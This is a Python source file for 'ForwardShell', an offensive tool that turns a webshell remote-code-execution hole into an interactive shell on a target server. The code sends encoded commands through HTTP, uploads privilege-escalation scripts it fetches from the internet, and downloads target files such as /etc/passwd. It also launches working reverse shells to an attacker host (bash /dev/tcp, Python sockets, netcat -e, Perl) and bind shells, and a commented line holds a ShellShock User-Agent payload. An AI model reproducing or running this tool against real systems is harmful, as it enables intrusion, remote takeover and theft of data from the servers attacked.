#!/usr/bin/python3
#
# This is a semiautomatic shell you can use if you get a simple Webshell RCE.
# ForwardShell has some nice features:
# - Upgrade your shell to a PTY with Python
# - ReverseShell in Bash, Python, Netcat and Perl
# - BindShell in Python, Netcat and Perl
# - File upload
# - File download
#
# Author: 61106960

import base64
import random
import requests
import threading
import time
import argparse
import sys
import os
import gzip
import re
from os.path import dirname

class WebShell(object):

######################################################################################
#                                                                                    #
# ForwardShell Init Function                                                         #
#                                                                                    #
# Initialise Variables                                                               # 
# Initialise FIFO Session                                                            #
# Initialise Shell                                                                   # 
#                                                                                    #
######################################################################################

    # Initialize Class + Setup Shell
    def __init__(self):
        # Set up basic things
        self.url = options.u
        self.parameter = options.p
        self.method = options.m.lower()
        self.lhost = options.lhost
        self.lport = options.lport
        self.revshell = options.revshell.lower()
        self.bindshell = options.bindshell.lower()
        self.working_path = options.path
        self.pyversion = ''
        self.ncversion = ''
        
        # Set up proxy
        if options.p:
            self.proxies = {'http' : f'{options.P}'}
        else:
            self.proxies = {}
        
        # Set up network speed
        if options.speed.strip().lower() == 'insane':
            self.interval=0.25
        elif options.speed.strip().lower() == 'fast':
            self.interval=1
        elif options.speed.strip().lower() == 'medium':
            self.interval=1.5
        elif options.speed.strip().lower() == 'slow':
            self.interval=3
        else:
            self.interval=1 # == fast

        # Set up chunk size for file upload
        if self.method == 'post':
            self.chunk_size = 80000
        elif self.method == 'get':
            self.chunk_size = 1850
        else:
            self.chunk_size = 1850
        
        # Set up binary paths
        self.BASH = '/bin/bash'
        self.BASE64 = '/usr/bin/base64'
        self.CAT = '/usr/bin/cat'
        self.CP = '/usr/bin/cp'
        self.ECHO = '/usr/bin/echo'
        self.GREP = '/usr/bin/grep'
        self.GZIP = '/usr/bin/gzip'
        self.KILL = '/usr/bin/kill'
        self.LS = '/usr/bin/ls'
        self.MKFIFO = '/usr/bin/mkfifo'
        self.MV = '/usr/bin/mv'
        self.PS = '/usr/bin/ps'
        self.RM = '/usr/bin/rm'
        self.SH = '/usr/bin/sh'
        self.TAIL = '/usr/bin/tail'
        self.WHICH = '/usr/bin/which'

        # Set up fifo session
        self.session = random.randrange(10000,99999)
        self.stdin = f'{self.working_path}/Fwdsh-input.{self.session}'
        self.stdout = f'{self.working_path}/Fwdsh-output.{self.session}'
        MakeNamedPipes = f"{self.MKFIFO} {self.stdin}; {self.TAIL} -f {self.stdin} | {self.SH} 2>&1 > {self.stdout}"

        # Set up shell
        print(f"[*] {__progname__} v{__version__}:")
        print(f"[*] Generate SessionID: {self.session}")
        print(f"[*] Trying to set up {__progname__} on Target {self.url}")
        self.RunRawCmd(MakeNamedPipes, timeout=1)
        raw_result = self.RunRawCmd(f"{self.LS} {self.stdout}")
        CheckConnction = self.DisplayResp(raw_result)
        if CheckConnction:
             CheckConnction = CheckConnction.rstrip()
        if CheckConnction == f'{self.stdout}':
            print(f"[+] Connection to {self.url} established")
            ClearOutput = f'{self.ECHO} -n "" > {self.stdout}'
            self.RunRawCmd(ClearOutput)
        else:
            print(f"[ERROR] Cannot connect to {self.url}")
            exit()

        # Set up read thread
        self.stop_threads = False
        self.thread = threading.Thread(target=self.ReadThread, args=(lambda : self.stop_threads,))
        self.thread.daemon = True
        self.thread.start()

######################################################################################
#                                                                                    #
# Command = ?                                                                        #
#                                                                                    #
# Functions are:                                                                     # 
# Help                  Show Program Help                                            #
#                                                                                    #
######################################################################################

    # Show program help function and set module parameters
    def Help(self, module):
        if module == 'main':
            print(
            f'[?] {__progname__} - Internal Commands:\n'
            f'\n'
            f'  ?set                    Change Bind- and RervseShell parameters, like LHOST, LPORT and Shell type\n'
            f'  ?start                  Start a {__progname__} shell module\n'
            f'  ?start -m {{module}}      Start a specific Shell module; available modules are Upgrade, RevShell and BindShell\n'
            f'  ?upload                 Upload a file or module to the target working directory {self.working_path}\n'
            f'  ?upload {{filename}}      Upload a local file to the target\n'
            f'  ?upload -m {{module}}     Upload a specific module to the target; available modules are LinPeas, exploit-suggester and linEnum\n'
            f'  ?download {{filename}}    Download a file from the target to your local working directory\n'
            f'  ?exit                   Stops the Shell, kills processes, removes files on the target system and exits the program\n'
            f'  ?exit -force            Stops the Shell, kill all processes and files from all possible running or stuck Shells\n')
        elif module == 'Set':
            print(
            f'[?] {__progname__} - ReverseShell Parameter:\n'
            f'\n'
            f'  LHOST                   {self.lhost}\n'
            f'  LPORT                   {self.lport}\n'
            f'  Revshell                {self.revshell} (possible values are Bash, Python, NetCat, Perl)\n'
            f'\n'
            f'[?] {__progname__} - BindShell Parameter:\n'
            f'\n'
            f'  LPORT                   {self.lport}\n'
            f'  Bindshell               {self.bindshell} (possible values are Python, Netcat, Perl)\n'
            f'\n'
            f'You can set the above parameter according to your needs, e.g.:\n> ?set LHOST 192.168.0.1\n> ?set LPORT 443\n> ?set Revshell Python\n> ?set BindShell Perl\n')
        elif module == 'Start':
            print(
            f'[?] {__progname__} - Modules:\n'
            f'\n'
            f'  ?start -m upgrade       Upgrade your shell to a PTY with Python\n'
            f'  ?start -m revshell      Start a ReverseShell with Bash [change from Bash to Python, NetCat or Perl via ?set]\n'
            f'  ?start -m bindshell     Start a BindShell with Python [change from Python to Netcat or Perl via ?set]\n')
        elif module == 'Upload':
            print(
            f'[?] {__progname__} - File Upload:\n'
            f'\n'
            f'  ?upload {{filename}}      Upload a local file to the target {self.working_path} directory\n'
            f'  ?upload -m {{module}}     Downloads a module file from the Internet source and uploads it directly to the target {self.working_path} directory\n'
            f'                          (possible modules are LinPeas, exploit-suggester, LinEnum)\n'
            f'\n'
            f'You can upload a file like:          You can upload a module like:\n'
            f'> ?upload linpeas.sh                 > ?upload -m LinPeas\n'
            f'> ?upload c:\\tools\\chisel            > ?upload -m exploit-suggester\n'
            f'> ?upload /usr/bin/ncat              > ?upload -m LinEnum\n')
        elif module == 'Download':
            print(
            f'[?] {__progname__} - File Download:\n'
            f'\n'
            f'  ?download {{filename}}     Download a file from the target to your local working directory\n'
            f'\n'
            f'You can download a single file (use always the complete path) like:\n'
            f'> ?download /etc/passwd\n')
        else:
            pass

######################################################################################
#                                                                                    #
# Command = ?set                                                                     #
#                                                                                    #
# Functions are:                                                                     # 
# SetParameter          Set Parameter for Bind- and RevShell                         #
#                                                                                    #
######################################################################################

    # Set program parameters
    def SetParameter(self, option, value):
        option, value = option.strip().lower(), value.strip().lower()
        if option == 'lhost':
            self.lhost = f'{value}'
            print()
            print(f'  [+] LHOST      {self.lhost}')
            print()
        elif option == 'lport':
            self.lport = f'{value}'
            print()
            print(f'  [+] LPORT     {self.lport}')
            print()
        elif option == 'revshell':
            RevShells = ['bash','python','netcat','perl']
            if value in RevShells:
                    self.revshell = f'{value}'
                    print()
                    print(f'  [+] Revshell  {self.revshell}')
                    print()
            else:
                print('[ERROR] Wrong ReverseShell version, use \'Bash\', \'Python\', \'Netcat\' or \'Perl\'\n')
        elif option == 'bindshell':
            BindShells = ['python','netcat','perl']
            if value in BindShells:
                    self.bindshell = f'{value}'
                    print()
                    print(f'  [+] Bindshell      {self.bindshell}')
                    print()
            else:
                print('[ERROR] Wrong BindShell version, use \'Python\', \'Netcat\' or \'Perl\'\n')
        else:
            print(f'[ERROR] option {option} is unknown\n')
            S.Help('Set')

######################################################################################
#                                                                                    #
# Command = ?start                                                                   #
#                                                                                    #
# Functions are:                                                                     # 
# UpgradeShell          Upgrades to a PTY Shell                                      #
# RevShell              Start a ReverseShell                                         #
# BindShell             Start a BindShell                                            #
#                                                                                    #
######################################################################################

    # Upgrade ForwardShell to PTY
    def UpgradeShell(self):
        if self.pyversion:
            pass
        else:
            self.GetProg('python')
        print(f'[*] Start PTY with {self.pyversion}')
        UpgradeShell = f"""{self.pyversion} -c 'import pty; pty.spawn("/bin/bash")'"""
        self.WriteCmd(UpgradeShell)

    # Start ReverseShell
    def RevShell(self):
        ##revshell = revshell.strip().lower()
        if self.lhost == '127.0.0.1':
            print('[ERROR] You have to set a valid LHOST first, use ?set')
        else:
            # Bash reverse shell
            if self.revshell == 'bash':
                print(f'[*] Starting ReverseShell with Bash to {self.lhost} on port {self.lport}\n')
                RevShellFormat = f"""{self.BASH} -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1' &"""
                self.WriteCmd(RevShellFormat)
            # Python reverse shell
            elif self.revshell == 'python':
                if self.pyversion:
                    pass
                else:
                    self.GetProg('python')
                print(f'[*] Starting ReverseShell with {self.pyversion} to {self.lhost} on port {self.lport}')
                RevShellFormat = f"""{self.pyversion} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{self.BASH}")' &"""
                self.WriteCmd(RevShellFormat)
            # NetCat reverse shell
            elif self.revshell == 'netcat':
                if self.ncversion:
                    pass
                else:
                    self.GetProg('netcat')
                print(f'[*] Starting ReverseShell with {self.ncversion} to {self.lhost} on port {self.lport}')
                RevShellFormat = f"""{self.ncversion} {self.lhost} {self.lport} -e {self.BASH} &"""
                self.WriteCmd(RevShellFormat)
            # Perl reverse shell
            elif self.revshell == 'perl':
                print(f'[*] Starting ReverseShell with Perl to {self.lhost} on port {self.lport}\n')
                RevShellFormat = f"""perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{self.lhost}:{self.lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' &"""
                self.WriteCmd(RevShellFormat)
            else:
                print('[ERROR] Something went wrong with starting the ReverseShell')

    # Start BindShell
    def BindShell(self):
        # NetCat bind shell
        if self.bindshell == 'netcat':
            if self.ncversion:
                pass
            else:
                self.GetProg('netcat')
            print(f'[*] Starting BindShell with {self.ncversion} on port {self.lport}')
            BindShellFormat = f"""{self.ncversion} -nlvp {self.lport} -e {self.BASH} &"""
            self.WriteCmd(BindShellFormat)
        # Python bind shell
        elif self.bindshell == 'python':
            if self.pyversion:
                pass
            else:
                self.GetProg('python')
                print(f'[*] Starting BindShell with {self.pyversion} on port {self.lport}')
                BindShellFormat = f"""{self.pyversion} -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{self.lport}));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["{self.BASH}","-i"])' &"""
                self.WriteCmd(BindShellFormat)
        # Perl bind shell
        elif self.bindshell == 'perl':
            print(f'[*] Starting BindShell with Perl on port {self.lport}')
            BindShellFormat = f"""perl -MIO -e 'use Socket;$protocol=getprotobyname('tcp');socket(S,&PF_INET,&SOCK_STREAM,$protocol);setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in({self.lport},INADDR_ANY));listen(S,3);while(1){{accept(CONN,S);if(!($pid=fork)){{die "Cannot fork" if (!defined $pid);open STDIN,"<&CONN";open STDOUT,">&CONN";open STDERR,">&CONN";exec "/bin/bash -i";close CONN;exit 0;}}}}' &"""
            self.WriteCmd(BindShellFormat)
        else:
            print('[ERROR] Something went wrong with Starting the BindShell')

######################################################################################
#                                                                                    #
# Command = ?upload                                                                  #
#                                                                                    #
# Functions are:                                                                     # 
# UploadCmd             Upload a file or module                                      #
# DownloadProg          Download pre-defined Internet Scripts                        #
#                                                                                    #
######################################################################################

    # Upload a file or module
    def UploadCmd(self, upload, stream=False, name='dummy'):
        # If the content of parameter 'upload' is a stream and not a file
        if stream:
            filename = name
            raw_data = upload

        # This is to read a file from the filesystem
        else:
            try:
                with open(upload, 'rb') as file:
                    filename = (os.path.split(upload))[1]
                    raw_data = file.read()
            except:
                print(f'[ERROR] Something went wrong with reading the file {upload}')
                return False

        # Compress and bas64 the content
        comp_data = gzip.compress(raw_data, compresslevel=9)
        enc_data = base64.b64encode(comp_data).decode('ascii')

        # Split the base64 blob in chunks; the size depends on GET or POST        
        print(f'[*] Calculating chunks of {filename}...')
        chunk_array = list(self.split_chunks(enc_data, n=self.chunk_size))
        for index, chunk in enumerate(chunk_array):
            print(f'[*] Uploading chunk {(index) +1} of {len(chunk_array)} from {filename} in progress...', end='\r', flush=True)
            upload_file = f'{self.ECHO} -n {chunk} >> {self.working_path}/{filename}.gz~b64'
            self.WriteCmd(upload_file, fifo=False)
        
        print(f'\n[!] Upload finished')
        expand_file = f'{self.CAT} {self.working_path}/{filename}.gz~b64 | {self.BASE64} -d > {self.working_path}/{filename}.gz ; {self.GZIP} -d -f {self.working_path}/{filename}.gz ; {self.RM} -f {self.working_path}/{filename}.gz~b64'
        self.WriteCmd(expand_file, fifo=False)

    # Downloads files from the Internet and uploads them to the target
    def DownloadProg(self, url, timeout=30):
        headers = {'User-Agent': f'{__progname__}/{__version__}'}
        try:
            r = requests.get(url, headers=headers, proxies=self.proxies, timeout=timeout)
            return r.content
        except:
            print(f'[ERROR] Something went wrong with downloading {url}')

######################################################################################
#                                                                                    #
# Command = ?download                                                                #
#                                                                                    #
# Functions are:                                                                     # 
# DownloadFile          Download a File from the Target                              #
#                                                                                    #
######################################################################################

    # Download a files from the target
    def DownloadFile(self, file):
        # gzip file, base64 it and request it
        file_download = f'{self.GZIP} {file} -c | {self.BASE64} -w0'
        print(f'[*] Downloading {file} in progress...')
        raw_result = self.WriteCmd(file_download, fifo=False)
        downloaded_file = self.DisplayResp(raw_result)
        try:
            # base64 decode it
            decoded_data = base64.b64decode(downloaded_file)
            # decompress it
            decompressed_data = gzip.decompress(decoded_data)
        except:
            print(f'[ERROR] Something went wrong with downloading {file}')
            print(f'{downloaded_file}')
            return False

        # write the binary blob to file
        filename = file.split('/')[-1].strip('"|\'')
        try:
            with open(filename, 'wb') as file:
                file.write(decompressed_data)
                print(f'[*] Saved the file {filename} successfuly')
        except:
            print(f'[ERROR] Something went wrong with saving the file {filename}')

######################################################################################
#                                                                                    #
# Command = ?exit                                                                    #
#                                                                                    #
# Functions are:                                                                     # 
# killCmd               Exits the program and cleanup the Target                     #
#                                                                                    #
######################################################################################

    # Terminating shell and deleting files
    def killCmd(self, force=False):
        # stop read thread
        self.stop_threads = True
        self.thread.join()
        if force == True:
            print(f'[*] Terminating all Shells')
            checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin.split(".")[0]} -e "-c import pty; pty.spawn("'
        else:
            print(f'[*] Terminating {__progname__} with SessionID: {self.session}')
            checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin} -e "-c import pty; pty.spawn("'
        
        # read result of ps -aux and kill processes
        raw_result = self.WriteCmd(checkProcess, fifo=False)
        result = self.DisplayResp(raw_result)

        processes = result.split('\n')
        for process in processes[0:]:
            if process >= '1':
                killproc = f'{self.KILL} {process.split()[1]}'
                self.WriteCmd(killproc, fifo=False)
            elif process < '1':
                pass
            else:
                print(f'[ERROR] No running {__progname__} process')
        
        # delete fifo files
        print(f'[*] Cleaning up files')
        if force == True:
            Fwdshellfiles = f'{self.RM} -f {self.stdin.split(".")[0]}.* ; {self.RM} -f {self.stdout.split(".")[0]}.*'
        else:
            Fwdshellfiles = f'{self.RM} -f {self.stdin} {self.stdout}'
        self.WriteCmd(Fwdshellfiles, fifo=False)
        print(f'[*] Have a nice day :-)')
        exit()

######################################################################################
#                                                                                    #
# ForwardShell Core Modules                                                          #
#                                                                                    #
# Functions are:                                                                     # 
# WriteCmd              Builds the RCE request                                       #
# RunRawCmd             Sends the RCE request to the target                          #
# ReadThread            Starts a Thread an reads RCE ouput constantly                #
#                                                                                    #
######################################################################################

    # Build the RCE command
    def WriteCmd(self, cmd, fifo=True):
        b64cmd = base64.b64encode('{}\n'.format(cmd.rstrip()).encode('utf-8')).decode('utf-8')
        if fifo:
            # if fifo enabled redirect the command in fifo-stdin
            stage_cmd = f'{self.ECHO} {b64cmd} | {self.BASE64} -d > {self.stdin}'
            self.RunRawCmd(stage_cmd)
        else:
            # if fifo disabled pipe the command directly to the shell
            stage_cmd = f'{self.ECHO} {b64cmd} | {self.BASE64} -d | {self.SH} 2>&1'
            return (self.RunRawCmd(stage_cmd))
        time.sleep(self.interval *1.0)

    # Execute command
    def RunRawCmd(self, cmd, timeout=10):
        # headers = {'User-Agent': f'() {{:;}}; {cmd}'} # MODIFY THIS: Payload in User-Agent if you have no Webshell but ShellShock
        headers = {'User-Agent': f'{__progname__}/{__version__}'}
        payload = cmd # Change this if your command needs some more adjustment
        data = {self.parameter: payload}

        try:
            if self.method == 'post':
                    r = requests.post(self.url, data=data, headers=headers, proxies=self.proxies, timeout=timeout)
            elif self.method == 'get':
                    r = requests.get(self.url, params=data, headers=headers, proxies=self.proxies, timeout=timeout)
            return r.text
        except:
            pass

    # Read $session, output text to screen & wipe session
    def ReadThread(self, stop):
        GetOutput = f"{self.CAT} {self.stdout}"
        while True:
            if stop():
                break
            raw_result = self.RunRawCmd(GetOutput)
            if raw_result:
                #print(self.DisplayResp(result)) #666
                
                #### some debug stuff
                result = self.DisplayResp(raw_result)
                if result == False:
                    pass
                else:
                    print(result)
                #### some debug stuff
                
                ClearOutput = f'{self.ECHO} -n "" > {self.stdout}'
                self.RunRawCmd(ClearOutput)
            time.sleep(self.interval *1.2)

######################################################################################
#                                                                                    #
# ForwardShell Helper Modules                                                        #
#                                                                                    #
# Functions are:                                                                     # 
# DisplayResp           Formats the raw RCE output                                   #
# GetBinPath            Gets the full path of a certain binary at the target         #
# GetProg               Gets the full path of Python and Netcat at the target        #
# split_chunks          Splits a string in chunks (for File Download)                #
#                                                                                    #
######################################################################################

    # Display the result of the request
    # Use this to adjust the results if needed
    def DisplayResp(self, raw_result):
            return raw_result # Comment this line to use the display filter below

            show_debug_messages = False # Set to True if you want to see debug output
            # Some silly examples how to format the server response
            # Current server response to the initial setup connection request
            # (it seems that the server puts the string 'foobar' in front of the expected result /dev/shm/Fwdsh.... ):
            # foobar/dev/shm/Fwdsh-output.25262
            #
            # Use the following example to split the raw input and response with the needed response
            # pattern = 'foobar'
            # result = re.split(pattern, raw_result)
            
            # simple Regex that splits the raw_result with a simple pattern
            pattern = 'foobar'
            result = re.split(pattern, raw_result)

            # For debug, it shows the different result chunks after the Regex            
            try:
                if show_debug_messages:
                    print(f'\n### DEBUG - Result before Regex - {raw_result}')
                    if result[0]: print(f'### DEBUG - Result after Regex - Chunk 0: {result[0]}')
                    if result[1]: print(f'### DEBUG - Result after Regex - Chunk 1: {result[1]}')
                    if result[2]: print(f'### DEBUG - Result after Regex - Chunk 2: {result[2]}')
                    if result[3]: print(f'### DEBUG - Result after Regex - Chunk 3: {result[3]}')
            except:
                pass
            
            try:
                # returns the Regex chunk
                # if result[0]: return(result[0].strip('\n')) # use the chunk number found in debug message from above
                # if result[1]: return(result[1].strip('\n')) # use the chunk number found in debug message from above
                if result[1]: return(result[1].strip('\n'))
                else: return False
            except:
                print('[ERROR] Something went wrong with your response display filter')
                print(f'[!] This was the raw server response:')
                print(raw_result)
                return False
             

    # Helper Module to get the file system path of a programm
    def GetBinPath(self, file):
        filename = f'{self.WHICH} {file}'
        raw_result = self.WriteCmd(filename, fifo=False).strip('\n')
        result = self.DisplayResp(raw_result)
        return result

    # Get Python and Netcat version on target
    def GetProg(self, prog):
        if prog == 'python':
            pythonversions = ['python','python3','python2']
            for version in pythonversions:
                result = self.GetBinPath(version)
                if result:
                    self.pyversion = result
                    print(f'[*] Found Python at {self.pyversion}')
                    return self.pyversion
            else:
                print(f'[ERROR] Did not find a Python interpreter on the target')
                self.pyversion = 'python'
                return self.pyversion
        if prog == 'netcat':
            netcatversions = ['ncat','netcat','nc']
            for version in netcatversions:
                result = self.GetBinPath(version)
                if result:
                    self.ncversion = result
                    print(f'[*] Found Netcat at {self.ncversion}')
                    return self.ncversion
            else:
                print(f'[ERROR] Did not find a netcat binary on the target')
                self.ncversion = 'netcat'
                return self.ncversion
        
    # Helper module to split var in chunks
    def split_chunks(self, seq, n=8000):
        while seq:
            yield seq[:n]
            seq = seq[n:]
    
######################################################################################
#                                                                                    #
# ForwardShell Main Function                                                         #
#                                                                                    #
######################################################################################

# Process command-line arguments.
if __name__ == '__main__':
    __progname__ = 'ForwardShell'
    __version__ = '0.1.0'

    parser = argparse.ArgumentParser(
        add_help = True,
        description = f'{__progname__} v{__version__} - Exploits a simple Webshell RCE and builds a semiautomatic shell',
        usage = f'python3 {__progname__}.py [-u <url>] [-p <cmd>] -M [<post>] [-P <proxy>]',
        epilog = 'HAVE FUN AND DON\'T BE EVIL!')

    parser.add_argument('-u', action='store', metavar='', help='http[s]://[fqdn,IP]/directory/upload/shell.[php,jsp]')
    parser.add_argument('-p', action='store', metavar='', default = 'cmd', help='The parameter of the uploaded webshell which executes the command [default=cmd]')
    parser.add_argument('-m', action='store', metavar='', default = 'POST', help='HTTP method to use for requests [GET, POST; default=POST]')
    parser.add_argument('-P', action='store', metavar='', default = '', help='Proxy to use for requests [http(s)://host:port]')

    group = parser.add_argument_group('you can use even more Bind- and ReverseShell arguments')
    group.add_argument('-lhost', action='store', metavar='', default = '127.0.0.1', help='Your local listening IP address if you use the ReverseShell option')
    group.add_argument('-lport', action='store', metavar='', default = '9001', help='Your local listening TCP port if you use the Bind- or ReverseShell option')
    group.add_argument('-revshell', action='store', metavar='', default = 'Bash', help='Kind of ReverseShell [Bash, Python, Perl; default=Bash]')
    group.add_argument('-bindshell', action='store', metavar='', default = 'Python', help='Kind of BindShell [Python, Netcat, Perl; default=Python]')
    group.add_argument('-speed', action='store', metavar='', default = 'fast', help='Network speed to the target [Insane, Fast, Medium, Slow; default=Fast]')
    group.add_argument('-path', action='store', metavar='', default = '/dev/shm', help='Default {__progname__} working path; Change it to /tmp if /dev/shm is not available')
    options = parser.parse_args()

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    # Initialize WebShell class
    S = WebShell()
    prompt = "Shell:> "
    
    print("[*] Type ? for help")
    while True:
        cmd = input(prompt).lower()
        if not cmd:
            pass
        else:
            CustomInput = cmd.split()
            Option = CustomInput[0]
            if Option == '?':
                S.Help('main')

            elif Option.casefold() == '?set':
                if len(CustomInput) >= 3:
                    param = CustomInput[1].lower()
                    value = CustomInput[2].lower()
                    S.SetParameter(param,value)
                else:
                    S.Help('Set')
    
            elif Option.casefold() == '?start':
                if len(CustomInput) >= 3:
                    param = CustomInput[1].lower()
                    module = CustomInput[2].lower()
                    if param == '-m':
                        if module == 'upgrade': S.UpgradeShell()
                        elif module == 'revshell': S.RevShell()
                        elif module == 'bindshell': S.BindShell()
                        else:
                            print(f'[ERROR] {module} is no valid module')
                            S.Help('Start')
                else:
                    print('[ERROR] Wrong ?start option')
                    S.Help('Start')

            elif Option.casefold() == '?upload':
                if len(CustomInput) == 2:
                    # cannot use space as strip seperator as it breaks a path with spaces
                    CustomInput = cmd.split('?upload')
                    upload_file = CustomInput[1].strip(' |"|\'')
                    S.UploadCmd(upload_file)
                elif len(CustomInput) >= 3:
                    param = CustomInput[1].lower()
                    module = CustomInput[2].lower()
                    if param == '-m':
                        if module == 'linpeas': module_url = 'https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh'
                        elif module == 'exploit-suggester': module_url = 'https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh'
                        elif module == 'linenum': module_url = 'https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh'
                        else:
                            print(f'[ERROR] {module} is no valid module')
                            S.Help('Upload')
                        # Download the file and upload it to the target
                        module_name = module_url.split('/')[-1]
                        downloaded_file = S.DownloadProg(module_url)
                        S.UploadCmd(downloaded_file, stream=True, name=module_name)
                    else:
                        print('[ERROR] Wrong ?upload option')
                        S.Help('Upload')
                else:
                    S.Help('Upload')
            
            elif Option.casefold() == '?download':
                if len(CustomInput) >= 2:
                    file_name = CustomInput[1].lower()
                    S.DownloadFile(file_name)
                else:
                    print('[ERROR] No download file specified')
                    S.Help('Download')

            elif Option.casefold() == '?exit':
                if len(CustomInput) >= 2:
                    set_attrib = CustomInput[1].lower()
                    if set_attrib == '-force':
                        S.killCmd(force=True)
                    else:
                        print(f'[ERROR] {set_attrib} not known; exit anyway')
                        S.killCmd()
                else:
                    S.killCmd()
            
            elif Option.startswith('?'):
                print(f'[ERROR] Function {Option} is unknown')
                S.Help('main')

            else:
                S.WriteCmd(cmd)